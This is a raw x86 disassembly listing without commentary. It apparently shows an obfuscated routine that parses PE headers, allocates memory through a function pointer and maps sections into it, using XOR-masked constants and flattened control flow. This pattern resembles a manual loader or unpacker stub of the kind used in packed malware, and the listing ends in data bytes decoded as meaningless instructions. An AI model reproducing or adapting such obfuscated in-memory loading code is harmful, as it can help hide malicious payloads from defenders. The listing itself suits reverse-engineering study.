  41fe55:	sub    eax,ecx
  41fe57:	mov    ecx,DWORD PTR [ebp-0x4]
  41fe5a:	cmp    ecx,eax
  41fe5c:	jbe    0x41fe17
  41fe5e:	mov    eax,DWORD PTR [ebp-0x1c]
  41fe61:	xor    eax,esi
  41fe63:	add    eax,edi
  41fe65:	mov    DWORD PTR [ebp-0x8],eax
  41fe68:	mov    DWORD PTR [ebp-0x18],0xf89c8686
  41fe6f:	mov    ebx,ebx
  41fe71:	jmp    0x41fed4
  41fe73:	mov    ecx,DWORD PTR [ebp-0x20]
  41fe76:	mov    eax,DWORD PTR [ebp-0x8]
  41fe79:	xor    ecx,esi
  41fe7b:	add    ecx,edi
  41fe7d:	shr    eax,cl
  41fe7f:	mov    DWORD PTR [ebp-0x4],eax
  41fe82:	mov    eax,DWORD PTR [ebp+0x8]
  41fe85:	mov    cl,BYTE PTR [eax]
  41fe87:	mov    BYTE PTR [ebp+0xb],cl
  41fe8a:	mov    cl,BYTE PTR [ebp+0xb]
  41fe8d:	mov    edx,DWORD PTR [ebp-0x8]
  41fe90:	movzx  ecx,cl
  41fe93:	xor    ecx,edx
  41fe95:	mov    DWORD PTR [ebp+0x8],ecx
  41fe98:	mov    ecx,DWORD PTR [ebp-0x18]
  41fe9b:	mov    edx,DWORD PTR [ebp+0x8]
  41fe9e:	xor    ecx,esi
  41fea0:	add    ecx,edi
  41fea2:	and    ecx,edx
  41fea4:	mov    ecx,DWORD PTR [ebp+ecx*4-0x420]
  41feab:	mov    edx,DWORD PTR [ebp-0x4]
  41feae:	xor    ecx,edx
  41feb0:	mov    DWORD PTR [ebp-0x8],ecx
  41feb3:	mov    ecx,DWORD PTR [ebp-0xc]
  41feb6:	xor    ecx,esi
  41feb8:	lea    eax,[eax+ecx*1+0x3272e2]
  41febf:	mov    DWORD PTR [ebp+0x8],eax
  41fec2:	mov    eax,DWORD PTR [ebp-0xc]
  41fec5:	xor    eax,esi
  41fec7:	mov    ecx,0xffcd8d1e
  41fecc:	sub    ecx,eax
  41fece:	add    ecx,DWORD PTR [ebp-0x10]
  41fed1:	mov    DWORD PTR [ebp-0x10],ecx
  41fed4:	mov    eax,DWORD PTR [ebp-0x14]
  41fed7:	mov    ecx,DWORD PTR [ebp-0x10]
  41feda:	xor    eax,esi
  41fedc:	add    eax,edi
  41fede:	cmp    ecx,eax
  41fee0:	jne    0x41fe73
  41fee2:	mov    eax,DWORD PTR [ebp-0x1c]
  41fee5:	mov    ecx,DWORD PTR [ebp-0x8]
  41fee8:	xor    eax,esi
  41feea:	add    eax,edi
  41feec:	pop    edi
  41feed:	pop    esi
  41feee:	xor    eax,ecx
  41fef0:	pop    ebx
  41fef1:	leave  
  41fef2:	ret    0x4
  41fef5:	push   ebp
  41fef6:	mov    ebp,esp
  41fef8:	mov    eax,DWORD PTR [ebp+0x1c]
  41fefb:	mov    ecx,DWORD PTR [ebp+0x8]
  41fefe:	mov    edx,DWORD PTR [ebp+0x10]
  41ff01:	mov    eax,DWORD PTR [eax+0x190]
  41ff07:	mov    eax,DWORD PTR [eax]
  41ff09:	sub    esp,0x64
  41ff0c:	push   ebx
  41ff0d:	push   esi
  41ff0e:	push   edi
  41ff0f:	mov    edi,0x751089b
  41ff14:	xor    ecx,edi
  41ff16:	mov    ebx,0x3272e2
  41ff1b:	add    ecx,ebx
  41ff1d:	cmp    ecx,edx
  41ff1f:	jne    0x41ff30
  41ff21:	or     DWORD PTR ds:0x3750c3f,0x4263eb0e
  41ff2b:	jmp    0x42042c
  41ff30:	mov    ecx,DWORD PTR [ebp+0x8]
  41ff33:	mov    esi,DWORD PTR [ebp+0x14]
  41ff36:	mov    edx,DWORD PTR [esi]
  41ff38:	xor    ecx,edi
  41ff3a:	add    ecx,ebx
  41ff3c:	cmp    edx,ecx
  41ff3e:	je     0x4203e7
  41ff44:	mov    ecx,DWORD PTR [ebp+0x1c]
  41ff47:	mov    DWORD PTR [ebp-0x1c],eax
  41ff4a:	mov    DWORD PTR [ebp+0x1c],ecx
  41ff4d:	mov    ecx,DWORD PTR [ebp+0x18]
  41ff50:	mov    eax,DWORD PTR [esi]
  41ff52:	mov    DWORD PTR [ebp-0x20],eax
  41ff55:	mov    DWORD PTR [ebp+0x8],0xf89c8585
  41ff5c:	mov    edx,0xf89c8584
  41ff61:	mov    DWORD PTR [ebp-0x8],edx
  41ff64:	mov    eax,DWORD PTR [ebp+0x1c]
  41ff67:	mov    DWORD PTR [ebp+0x1c],eax
  41ff6a:	mov    eax,DWORD PTR [ebp+0x1c]
  41ff6d:	mov    eax,DWORD PTR [eax+0x190]
  41ff73:	mov    eax,DWORD PTR [eax]
  41ff75:	mov    DWORD PTR [ebp-0x24],ecx
  41ff78:	mov    ecx,DWORD PTR [ebp+0x1c]
  41ff7b:	mov    ecx,DWORD PTR [ecx+0x190]
  41ff81:	mov    ecx,DWORD PTR [ecx]
  41ff83:	add    ecx,DWORD PTR [eax+0x3c]
  41ff86:	mov    DWORD PTR [ebp+0x10],ecx
  41ff89:	mov    eax,DWORD PTR [ebp+0x8]
  41ff8c:	xor    eax,edi
  41ff8e:	add    eax,ebx
  41ff90:	mov    DWORD PTR [ebp-0x4],eax
  41ff93:	mov    eax,DWORD PTR [ebp+0x8]
  41ff96:	xor    eax,edi
  41ff98:	add    eax,ebx
  41ff9a:	mov    DWORD PTR [ebp+0x18],eax
  41ff9d:	mov    eax,DWORD PTR [ebp+0x10]
  41ffa0:	mov    eax,DWORD PTR [eax+0x50]
  41ffa3:	sub    eax,0xc
  41ffa6:	mov    DWORD PTR [ebp-0x28],eax
  41ffa9:	mov    eax,DWORD PTR [ebp+0x10]
  41ffac:	mov    eax,DWORD PTR [eax+0x38]
  41ffaf:	mov    ecx,DWORD PTR [ebp+0x10]
  41ffb2:	dec    eax
  41ffb3:	test   DWORD PTR [ecx+0x54],eax
  41ffb6:	mov    eax,DWORD PTR [ebp+0x10]
  41ffb9:	je     0x41ffd3
  41ffbb:	mov    eax,DWORD PTR [eax+0x38]
  41ffbe:	mov    ecx,DWORD PTR [ebp+0x10]
  41ffc1:	mov    ecx,DWORD PTR [ecx+0x54]
  41ffc4:	dec    eax
  41ffc5:	not    eax
  41ffc7:	and    ecx,eax
  41ffc9:	mov    eax,DWORD PTR [ebp+0x10]
  41ffcc:	mov    eax,DWORD PTR [eax+0x38]
  41ffcf:	add    eax,ecx
  41ffd1:	jmp    0x41ffd6
  41ffd3:	mov    eax,DWORD PTR [eax+0x54]
  41ffd6:	mov    DWORD PTR [ebp+0x1c],eax
  41ffd9:	mov    eax,DWORD PTR [ebp+0x8]
  41ffdc:	xor    eax,edi
  41ffde:	add    eax,ebx
  41ffe0:	mov    DWORD PTR [ebp+0x18],eax
  41ffe3:	mov    eax,DWORD PTR [ebp+0x8]
  41ffe6:	xor    eax,edi
  41ffe8:	add    eax,ebx
  41ffea:	mov    DWORD PTR [ebp+0x18],eax
  41ffed:	mov    eax,DWORD PTR [ebp+0x8]
  41fff0:	mov    ecx,DWORD PTR [ebp-0x24]
  41fff3:	xor    eax,edi
  41fff5:	add    eax,ebx
  41fff7:	mov    DWORD PTR [ecx],eax
  41fff9:	mov    DWORD PTR [ebp+0x18],edx
  41fffc:	mov    DWORD PTR [ebp+0x18],0xf89c85bb
  420003:	mov    DWORD PTR [ebp+0x18],0xf89c85ba
  42000a:	mov    DWORD PTR [ebp+0x18],0xf89c85b9
  420011:	mov    eax,DWORD PTR [ebp-0x8]
  420014:	mov    ecx,DWORD PTR [ebp+0x1c]
  420017:	xor    eax,edi
  420019:	add    eax,ebx
  42001b:	imul   eax,ecx
  42001e:	mov    ecx,DWORD PTR [ebp+0x8]
  420021:	mov    edx,DWORD PTR [ebp-0x28]
  420024:	xor    ecx,edi
  420026:	lea    ecx,[ecx+edx*1+0x3272e2]
  42002d:	cmp    eax,ecx
  42002f:	jae    0x4203e0
  420035:	mov    eax,DWORD PTR [ebp+0x8]
  420038:	xor    eax,edi
  42003a:	add    eax,ebx
  42003c:	mov    DWORD PTR [ebp+0x18],eax
  42003f:	mov    eax,DWORD PTR [ebp+0x1c]
  420042:	add    eax,DWORD PTR [ebp-0x1c]
  420045:	mov    DWORD PTR [ebp-0x4],eax
  420048:	push   DWORD PTR [ebp-0x4]
  42004b:	mov    esi,DWORD PTR [ebp-0x1c]
  42004e:	mov    ecx,DWORD PTR [ebp+0x10]
  420051:	call   0x41f149
  420056:	mov    DWORD PTR [ebp+0xc],eax
  420059:	mov    DWORD PTR [ebp-0x18],0xf89c85bd
  420060:	mov    eax,DWORD PTR [ebp-0x18]
  420063:	xor    eax,edi
  420065:	lea    ecx,[ebp-0x40]
  420068:	add    eax,ebx
  42006a:	push   ecx
  42006b:	call   0x41f72c
  420070:	mov    eax,DWORD PTR [ebp+0xc]
  420073:	test   eax,eax
  420075:	je     0x4200c5
  420077:	mov    eax,DWORD PTR [ebp-0x18]
  42007a:	xor    eax,edi
  42007c:	add    eax,ebx
  42007e:	push   eax
  42007f:	push   DWORD PTR [ebp+0xc]
  420082:	lea    eax,[ebp-0x40]
  420085:	push   eax
  420086:	call   0x41f5d3
  42008b:	mov    eax,DWORD PTR [ebp-0x4]
  42008e:	mov    DWORD PTR [ebp-0x18],eax
  420091:	mov    eax,DWORD PTR [ebp-0x18]
  420094:	mov    ecx,DWORD PTR [ebp-0x1c]
  420097:	sub    eax,ecx
  420099:	mov    DWORD PTR [ebp-0x18],eax
  42009c:	mov    eax,DWORD PTR [ebp+0xc]
  42009f:	mov    ecx,DWORD PTR [ebp+0xc]
  4200a2:	mov    eax,DWORD PTR [eax+0x10]
  4200a5:	add    eax,DWORD PTR [ecx+0xc]
  4200a8:	mov    ecx,DWORD PTR [ebp-0x18]
  4200ab:	cmp    ecx,eax
  4200ad:	jb     0x4200c5
  4200af:	mov    eax,DWORD PTR [ebp+0xc]
  4200b2:	mov    eax,DWORD PTR [eax+0xc]
  4200b5:	mov    ecx,DWORD PTR [ebp+0xc]
  4200b8:	add    eax,DWORD PTR [ecx+0x8]
  4200bb:	mov    ecx,DWORD PTR [ebp-0x18]
  4200be:	sub    eax,ecx
  4200c0:	jmp    0x4203b3
  4200c5:	push   0xc
  4200c7:	push   DWORD PTR [ebp-0x4]
  4200ca:	lea    eax,[ebp-0x4c]
  4200cd:	push   eax
  4200ce:	call   0x41f5d3
  4200d3:	mov    eax,0xf89c8585
  4200d8:	mov    DWORD PTR [ebp-0x2c],eax
  4200db:	mov    DWORD PTR [ebp-0x30],0xf89c8584
  4200e2:	mov    DWORD PTR [ebp-0x34],0xf89c85bb
  4200e9:	mov    DWORD PTR [ebp-0x38],0xf89c85ba
  4200f0:	lea    ecx,[ebp-0x2c]
  4200f3:	mov    DWORD PTR [ebp-0xc],ecx
  4200f6:	lea    ecx,[ebp-0x30]
  4200f9:	mov    DWORD PTR [ebp-0x10],ecx
  4200fc:	lea    ecx,[ebp-0x34]
  4200ff:	mov    DWORD PTR [ebp+0xc],ecx
  420102:	lea    ecx,[ebp-0x38]
  420105:	mov    DWORD PTR [ebp-0x14],ecx
  420108:	mov    ecx,DWORD PTR [ebp+0x8]
  42010b:	xor    ecx,edi
  42010d:	add    ecx,ebx
  42010f:	mov    DWORD PTR [ebp-0x18],ecx
  420112:	jmp    0x42030e
  420117:	cmp    eax,0xf89c85bb
  42011c:	je     0x420320
  420122:	mov    ecx,DWORD PTR [ebp-0x8]
  420125:	xor    ecx,edi
  420127:	mov    esi,eax
  420129:	add    ecx,ebx
  42012b:	mov    DWORD PTR [ebp+0x18],ecx
  42012e:	mov    eax,DWORD PTR [ebp-0x18]
  420131:	xor    esi,edi
  420133:	lea    eax,[eax+esi*1+0x3272e2]
  42013a:	mov    DWORD PTR [ebp-0x18],eax
  42013d:	mov    eax,DWORD PTR [ebp-0x8]
  420140:	mov    ecx,DWORD PTR [ebp-0x18]
  420143:	xor    eax,edi
  420145:	add    eax,ebx
  420147:	cmp    ecx,eax
  420149:	jne    0x42015e
  42014b:	mov    eax,DWORD PTR [ebp+0x8]
  42014e:	xor    eax,edi
  420150:	add    eax,ebx
  420152:	push   eax
  420153:	push   0xc
  420155:	lea    eax,[ebp-0x4c]
  420158:	push   eax
  420159:	call   0x41fb60
  42015e:	mov    eax,DWORD PTR [ebp-0xc]
  420161:	mov    eax,DWORD PTR [eax]
  420163:	xor    eax,edi
  420165:	mov    al,BYTE PTR [ebp+eax*1+0x327296]
  42016c:	mov    ecx,DWORD PTR [ebp+0x8]
  42016f:	xor    ecx,edi
  420171:	movzx  eax,al
  420174:	add    ecx,ebx
  420176:	cmp    eax,ecx
  420178:	je     0x4202f6
  42017e:	mov    eax,DWORD PTR [ebp-0x10]
  420181:	mov    eax,DWORD PTR [eax]
  420183:	xor    eax,edi
  420185:	mov    al,BYTE PTR [ebp+eax*1+0x327296]
  42018c:	mov    ecx,DWORD PTR [ebp+0x8]
  42018f:	xor    ecx,edi
  420191:	movzx  eax,al
  420194:	add    ecx,ebx
  420196:	cmp    eax,ecx
  420198:	je     0x4202f6
  42019e:	mov    eax,DWORD PTR [ebp+0xc]
  4201a1:	mov    eax,DWORD PTR [eax]
  4201a3:	xor    eax,edi
  4201a5:	mov    al,BYTE PTR [ebp+eax*1+0x327296]
  4201ac:	mov    ecx,DWORD PTR [ebp+0x8]
  4201af:	xor    ecx,edi
  4201b1:	movzx  eax,al
  4201b4:	add    ecx,ebx
  4201b6:	cmp    eax,ecx
  4201b8:	je     0x4202f6
  4201be:	mov    eax,DWORD PTR [ebp-0x14]
  4201c1:	mov    eax,DWORD PTR [eax]
  4201c3:	xor    eax,edi
  4201c5:	mov    al,BYTE PTR [ebp+eax*1+0x327296]
  4201cc:	mov    ecx,DWORD PTR [ebp+0x8]
  4201cf:	xor    ecx,edi
  4201d1:	movzx  eax,al
  4201d4:	add    ecx,ebx
  4201d6:	cmp    eax,ecx
  4201d8:	je     0x4202f6
  4201de:	mov    eax,DWORD PTR [ebp-0x10]
  4201e1:	mov    eax,DWORD PTR [eax]
  4201e3:	xor    eax,edi
  4201e5:	mov    al,BYTE PTR [ebp+eax*1+0x327296]
  4201ec:	mov    ecx,DWORD PTR [ebp-0xc]
  4201ef:	mov    ecx,DWORD PTR [ecx]
  4201f1:	xor    ecx,edi
  4201f3:	mov    cl,BYTE PTR [ebp+ecx*1+0x327296]
  4201fa:	xor    al,cl
  4201fc:	mov    ecx,DWORD PTR [ebp+0xc]
  4201ff:	mov    ecx,DWORD PTR [ecx]
  420201:	xor    ecx,edi
  420203:	mov    cl,BYTE PTR [ebp+ecx*1+0x327296]
  42020a:	or     al,cl
  42020c:	mov    ecx,DWORD PTR [ebp-0xc]
  42020f:	mov    ecx,DWORD PTR [ecx]
  420211:	xor    ecx,edi
  420213:	mov    cl,BYTE PTR [ebp+ecx*1+0x32729a]
  42021a:	cmp    cl,al
  42021c:	jne    0x4202f6
  420222:	mov    eax,DWORD PTR [ebp+0xc]
  420225:	mov    eax,DWORD PTR [eax]
  420227:	xor    eax,edi
  420229:	mov    al,BYTE PTR [ebp+eax*1+0x327296]
  420230:	mov    ecx,DWORD PTR [ebp-0x10]
  420233:	mov    ecx,DWORD PTR [ecx]
  420235:	xor    ecx,edi
  420237:	mov    cl,BYTE PTR [ebp+ecx*1+0x327296]
  42023e:	xor    al,cl
  420240:	mov    ecx,DWORD PTR [ebp-0x14]
  420243:	mov    ecx,DWORD PTR [ecx]
  420245:	xor    ecx,edi
  420247:	mov    cl,BYTE PTR [ebp+ecx*1+0x327296]
  42024e:	or     al,cl
  420250:	mov    ecx,DWORD PTR [ebp-0x10]
  420253:	mov    ecx,DWORD PTR [ecx]
  420255:	xor    ecx,edi
  420257:	mov    cl,BYTE PTR [ebp+ecx*1+0x32729a]
  42025e:	cmp    cl,al
  420260:	jne    0x4202f6
  420266:	mov    eax,DWORD PTR [ebp-0x14]
  420269:	mov    eax,DWORD PTR [eax]
  42026b:	xor    eax,edi
  42026d:	mov    al,BYTE PTR [ebp+eax*1+0x327296]
  420274:	mov    ecx,DWORD PTR [ebp+0xc]
  420277:	mov    ecx,DWORD PTR [ecx]
  420279:	xor    ecx,edi
  42027b:	mov    cl,BYTE PTR [ebp+ecx*1+0x327296]
  420282:	xor    al,cl
  420284:	mov    ecx,DWORD PTR [ebp-0xc]
  420287:	mov    ecx,DWORD PTR [ecx]
  420289:	xor    ecx,edi
  42028b:	mov    cl,BYTE PTR [ebp+ecx*1+0x327296]
  420292:	or     al,cl
  420294:	mov    ecx,DWORD PTR [ebp+0xc]
  420297:	mov    ecx,DWORD PTR [ecx]
  420299:	xor    ecx,edi
  42029b:	mov    cl,BYTE PTR [ebp+ecx*1+0x32729a]
  4202a2:	cmp    cl,al
  4202a4:	jne    0x4202f6
  4202a6:	mov    eax,DWORD PTR [ebp-0x14]
  4202a9:	mov    eax,DWORD PTR [eax]
  4202ab:	xor    eax,edi
  4202ad:	mov    al,BYTE PTR [ebp+eax*1+0x327296]
  4202b4:	mov    ecx,DWORD PTR [ebp-0xc]
  4202b7:	mov    ecx,DWORD PTR [ecx]
  4202b9:	xor    ecx,edi
  4202bb:	mov    cl,BYTE PTR [ebp+ecx*1+0x327296]
  4202c2:	xor    al,cl
  4202c4:	mov    ecx,DWORD PTR [ebp-0x10]
  4202c7:	mov    ecx,DWORD PTR [ecx]
  4202c9:	xor    ecx,edi
  4202cb:	mov    cl,BYTE PTR [ebp+ecx*1+0x327296]
  4202d2:	or     al,cl
  4202d4:	mov    ecx,DWORD PTR [ebp-0x14]
  4202d7:	mov    ecx,DWORD PTR [ecx]
  4202d9:	xor    ecx,edi
  4202db:	mov    cl,BYTE PTR [ebp+ecx*1+0x32729a]
  4202e2:	cmp    cl,al
  4202e4:	jne    0x4202f6
  4202e6:	lea    eax,[ebp-0x4c]
  4202e9:	push   eax
  4202ea:	call   0x41fdb1
  4202ef:	mov    ecx,DWORD PTR [ebp-0x44]
  4202f2:	cmp    eax,ecx
  4202f4:	je     0x420300
  4202f6:	mov    eax,DWORD PTR [ebp+0x8]
  4202f9:	xor    eax,edi
  4202fb:	add    eax,ebx
  4202fd:	mov    DWORD PTR [ebp+0x18],eax
  420300:	mov    eax,DWORD PTR [ebp-0x8]
  420303:	xor    eax,edi
  420305:	lea    eax,[eax+esi*1+0x3272e2]
  42030c:	xor    eax,edi
  42030e:	mov    ecx,DWORD PTR [ebp+0x8]
  420311:	mov    edx,DWORD PTR [ebp+0x18]
  420314:	xor    ecx,edi
  420316:	add    ecx,ebx
  420318:	cmp    edx,ecx
  42031a:	je     0x420117
  420320:	mov    eax,DWORD PTR [ebp+0x8]
  420323:	mov    ecx,DWORD PTR [ebp+0x18]
  420326:	xor    eax,edi
  420328:	add    eax,ebx
  42032a:	cmp    ecx,eax
  42032c:	jne    0x42033f
  42032e:	mov    eax,DWORD PTR [ebp-0x8]
  420331:	mov    ecx,DWORD PTR [ebp+0x1c]
  420334:	xor    eax,edi
  420336:	lea    eax,[eax+ecx*1+0x3272e2]
  42033d:	jmp    0x4203b6
  42033f:	push   0x18
  420341:	push   DWORD PTR [ebp-0x4]
  420344:	lea    eax,[ebp-0x64]
  420347:	push   eax
  420348:	call   0x41f5d3
  42034d:	mov    eax,DWORD PTR [ebp+0x8]
  420350:	mov    ecx,DWORD PTR [ebp-0x18]
  420353:	xor    eax,edi
  420355:	add    eax,ebx
  420357:	cmp    eax,ecx
  420359:	je     0x42036e
  42035b:	mov    eax,DWORD PTR [ebp+0x8]
  42035e:	xor    eax,edi
  420360:	add    eax,ebx
  420362:	push   eax
  420363:	push   0x18
  420365:	lea    eax,[ebp-0x64]
  420368:	push   eax
  420369:	call   0x41fb60
  42036e:	mov    eax,DWORD PTR [ebp-0x4]
  420371:	add    eax,0x18
  420374:	mov    DWORD PTR [ebp+0x18],eax
  420377:	push   DWORD PTR [ebp-0x50]
  42037a:	push   DWORD PTR [ebp+0x18]
  42037d:	mov    eax,DWORD PTR [ebp-0x54]
  420380:	add    eax,DWORD PTR [ebp-0x20]
  420383:	push   eax
  420384:	call   0x41f5d3
  420389:	mov    eax,DWORD PTR [ebp+0x8]
  42038c:	mov    ecx,DWORD PTR [ebp-0x18]
  42038f:	xor    eax,edi
  420391:	add    eax,ebx
  420393:	cmp    eax,ecx
  420395:	je     0x4203a8
  420397:	push   0x0
  420399:	push   DWORD PTR [ebp-0x50]
  42039c:	mov    eax,DWORD PTR [ebp-0x54]
  42039f:	add    eax,DWORD PTR [ebp-0x20]
  4203a2:	push   eax
  4203a3:	call   0x41fb60
  4203a8:	mov    eax,DWORD PTR [ebp-0x24]
  4203ab:	mov    ecx,DWORD PTR [ebp-0x50]
  4203ae:	add    DWORD PTR [eax],ecx
  4203b0:	mov    eax,DWORD PTR [ebp-0x50]
  4203b3:	add    eax,DWORD PTR [ebp+0x1c]
  4203b6:	mov    DWORD PTR [ebp+0x1c],eax
  4203b9:	mov    eax,DWORD PTR [ebp-0x8]
  4203bc:	mov    ecx,DWORD PTR [ebp+0x1c]
  4203bf:	xor    eax,edi
  4203c1:	add    eax,ebx
  4203c3:	imul   eax,ecx
  4203c6:	mov    ecx,DWORD PTR [ebp+0x8]
  4203c9:	mov    edx,DWORD PTR [ebp-0x28]
  4203cc:	xor    ecx,edi
  4203ce:	lea    ecx,[ecx+edx*1+0x3272e2]
  4203d5:	cmp    eax,ecx
  4203d7:	jb     0x420035
  4203dd:	mov    esi,DWORD PTR [ebp+0x14]
  4203e0:	mov    eax,DWORD PTR [ebp-0x20]
  4203e3:	mov    DWORD PTR [esi],eax
  4203e5:	jmp    0x42042c
  4203e7:	mov    ecx,DWORD PTR [ebp+0x8]
  4203ea:	mov    edx,DWORD PTR [ebp+0xc]
  4203ed:	xor    ecx,edi
  4203ef:	xor    edx,edi
  4203f1:	add    ecx,ebx
  4203f3:	add    edx,ebx
  4203f5:	cmp    ecx,edx
  4203f7:	jne    0x42040b
  4203f9:	mov    eax,ds:0x7f642d1e
  4203fe:	imul   eax,eax,0x9f15fcef
  420404:	mov    ds:0x7f642d1e,eax
  420409:	jmp    0x42042c
  42040b:	mov    ecx,DWORD PTR [ebp+0x8]
  42040e:	xor    ecx,edi
  420410:	add    ecx,ebx
  420412:	cmp    eax,ecx
  420414:	je     0x420422
  420416:	sub    DWORD PTR ds:0xf861e3e,0x709beac2
  420420:	jmp    0x42042c
  420422:	and    DWORD PTR ds:0x3343fa1e,0x5265ec3f
  42042c:	pop    edi
  42042d:	pop    esi
  42042e:	pop    ebx
  42042f:	leave  
  420430:	ret    0x18
  420433:	push   ebp
  420434:	mov    ebp,esp
  420436:	and    esp,0xfffffff8
  420439:	mov    eax,DWORD PTR [ebp+0x20]
  42043c:	sub    esp,0x14
  42043f:	push   ebx
  420440:	mov    ebx,DWORD PTR [ebp+0x14]
  420443:	push   esi
  420444:	push   edi
  420445:	cmp    eax,0xf89c8585
  42044a:	jne    0x420456
  42044c:	push   0xf89c8584
  420451:	jmp    0x420588
  420456:	mov    eax,DWORD PTR [ebp+0x20]
  420459:	cmp    eax,0xf89c8584
  42045e:	jne    0x42046a
  420460:	push   0xf89c85bb
  420465:	jmp    0x420588
  42046a:	mov    eax,DWORD PTR [ebp+0x20]
  42046d:	cmp    eax,0xf89c85bb
  420472:	jne    0x42047e
  420474:	push   0xf89c85ba
  420479:	jmp    0x420588
  42047e:	mov    eax,DWORD PTR [ebp+0x20]
  420481:	cmp    eax,0xf89c85ba
  420486:	jne    0x420492
  420488:	push   0xf89c85b9
  42048d:	jmp    0x420588
  420492:	mov    ecx,DWORD PTR [ebp+0x20]
  420495:	mov    eax,0xf89c85be
  42049a:	cmp    ecx,eax
  42049c:	jne    0x420558
  4204a2:	mov    eax,DWORD PTR [ebp+0x10]
  4204a5:	mov    DWORD PTR [esp+0xc],eax
  4204a9:	mov    eax,DWORD PTR [ebp+0x18]
  4204ac:	mov    DWORD PTR [esp+0x14],eax
  4204b0:	mov    eax,DWORD PTR [ebp+0xc]
  4204b3:	mov    DWORD PTR [esp+0x18],eax
  4204b7:	mov    eax,DWORD PTR [ebp+0x8]
  4204ba:	mov    DWORD PTR [esp+0x10],eax
  4204be:	mov    eax,DWORD PTR [esp+0x10]
  4204c2:	mov    ecx,DWORD PTR [esp+0x14]
  4204c6:	mov    edi,0x751089b
  4204cb:	xor    eax,edi
  4204cd:	mov    esi,0x3272e2
  4204d2:	add    eax,esi
  4204d4:	mov    DWORD PTR [ecx],eax
  4204d6:	mov    eax,DWORD PTR [esp+0xc]
  4204da:	mov    eax,DWORD PTR [eax+0x194]
  4204e0:	mov    ecx,DWORD PTR [eax]
  4204e2:	mov    eax,DWORD PTR [esp+0xc]
  4204e6:	mov    eax,DWORD PTR [eax+0x194]
  4204ec:	mov    eax,DWORD PTR [eax]
  4204ee:	add    eax,DWORD PTR [ecx+0x3c]
  4204f1:	mov    ecx,DWORD PTR [esp+0xc]
  4204f5:	mov    ecx,DWORD PTR [ecx+0x1d8]
  4204fb:	mov    ecx,DWORD PTR [ecx+0x14]
  4204fe:	push   0x4
  420500:	push   0x3000
  420505:	push   DWORD PTR [eax+0x50]
  420508:	push   0x0
  42050a:	call   ecx
  42050c:	mov    DWORD PTR [ebx],eax
  42050e:	mov    eax,DWORD PTR [esp+0x10]
  420512:	push   DWORD PTR [esp+0xc]
  420516:	xor    eax,edi
  420518:	add    eax,esi
  42051a:	mov    DWORD PTR [esp+0x20],eax
  42051e:	lea    eax,[esp+0x20]
  420522:	push   eax
  420523:	push   ebx
  420524:	push   DWORD PTR [esp+0x20]
  420528:	push   DWORD PTR [esp+0x28]
  42052c:	push   DWORD PTR [esp+0x24]
  420530:	call   0x41fef5
  420535:	mov    eax,DWORD PTR [esp+0x10]
  420539:	mov    ecx,DWORD PTR [ebx]
  42053b:	xor    eax,edi
  42053d:	add    eax,esi
  42053f:	cmp    ecx,eax
  420541:	je     0x42059f
  420543:	mov    eax,DWORD PTR [esp+0x18]
  420547:	mov    ecx,DWORD PTR [esp+0x14]
  42054b:	xor    eax,edi
  42054d:	add    eax,esi
  42054f:	imul   eax,DWORD PTR [esp+0x1c]
  420554:	mov    DWORD PTR [ecx],eax
  420556:	jmp    0x42059f
  420558:	mov    ecx,DWORD PTR [ebp+0x20]
  42055b:	cmp    ecx,0xf89c85b9
  420561:	jne    0x42056a
  420563:	push   0xf89c85b8
  420568:	jmp    0x420588
  42056a:	mov    ecx,DWORD PTR [ebp+0x20]
  42056d:	cmp    ecx,0xf89c85b8
  420573:	jne    0x42057c
  420575:	push   0xf89c85bf
  42057a:	jmp    0x420588
  42057c:	mov    ecx,DWORD PTR [ebp+0x20]
  42057f:	cmp    ecx,0xf89c85bf
  420585:	jne    0x42059f
  420587:	push   eax
  420588:	push   DWORD PTR [ebp+0x1c]
  42058b:	push   DWORD PTR [ebp+0x18]
  42058e:	push   ebx
  42058f:	push   DWORD PTR [ebp+0x10]
  420592:	push   DWORD PTR [ebp+0xc]
  420595:	push   DWORD PTR [ebp+0x8]
  420598:	call   0x420433
  42059d:	mov    DWORD PTR [ebx],eax
  42059f:	mov    eax,DWORD PTR [ebx]
  4205a1:	pop    edi
  4205a2:	pop    esi
  4205a3:	pop    ebx
  4205a4:	mov    esp,ebp
  4205a6:	pop    ebp
  4205a7:	ret    0x1c
  4205aa:	push   ebp
  4205ab:	mov    ebp,esp
  4205ad:	sub    esp,0xc
  4205b0:	mov    eax,0xf89c8585
  4205b5:	mov    DWORD PTR [ebp-0x8],eax
  4205b8:	mov    DWORD PTR [ebp-0xc],0xf89c8584
  4205bf:	mov    ecx,DWORD PTR [ebp-0x8]
  4205c2:	xor    ecx,0x751089b
  4205c8:	add    ecx,0x3272e2
  4205ce:	mov    DWORD PTR [ebp-0x4],ecx
  4205d1:	mov    ecx,DWORD PTR [ebp+0xc]
  4205d4:	push   eax
  4205d5:	mov    DWORD PTR [ebp+0xc],ecx
  4205d8:	push   DWORD PTR [ebp+0xc]
  4205db:	lea    eax,[ebp-0x4]
  4205de:	push   DWORD PTR [ebp+0x8]
  4205e1:	push   eax
  4205e2:	push   DWORD PTR [ebp+0xc]
  4205e5:	push   DWORD PTR [ebp-0xc]
  4205e8:	push   DWORD PTR [ebp-0x8]
  4205eb:	call   0x420433
  4205f0:	mov    DWORD PTR [ebp-0x4],eax
  4205f3:	mov    eax,DWORD PTR [ebp-0x4]
  4205f6:	leave  
  4205f7:	ret    0x8
  4205fa:	jg     0x4205b0
  4205fc:	jge    0xf741c5d1
  420602:	add    ebp,DWORD PTR [eax-0xa]
  420605:	stos   WORD PTR es:[edi],ax
  420607:	ja     0x4205bb
  420609:	ret    0x8308
  42060c:	add    DWORD PTR [eax],eax
  42060e:	std    
  42060f:	add    DWORD PTR [eax],eax
  420611:	add    BYTE PTR [esi],dh
  420613:	sub    ebx,edx
  420615:	pop    edi
  420616:	ficomp WORD PTR [ecx]
  420618:	lea    ebx,[ecx+0x37]
  42061b:	lods   al,BYTE PTR ds:[esi]
  42061c:	adc    al,0x7
  42061e:	or     dl,bl
  420620:	out    dx,al
  420621:	adc    DWORD PTR [ebp-0x44],esp
  420624:	adc    edx,ecx
  420626:	push   edi
  420627:	outs   dx,DWORD PTR ds:[esi]
  420628:	(bad)  [ebx+0x7d]
  42062b:	jne    0x4206a5
  42062d:	mov    edx,0xa38027ad
  420632:	fwait
  420633:	shl    DWORD PTR [eax+0x54],1
  420636:	mov    eax,ds:0xf48ed6a4
  42063b:	repnz adc DWORD PTR [ecx],edx
  42063e:	mov    WORD PTR [eax-0x1baad77c],?
  420644:	mov    al,ds:0x9afa536b
  420649:	sub    BYTE PTR [ebx-0x2b],0x9c
  42064d:	ins    DWORD PTR es:[edi],dx
  42064e:	cmp    BYTE PTR [eax-0xe],0xe0
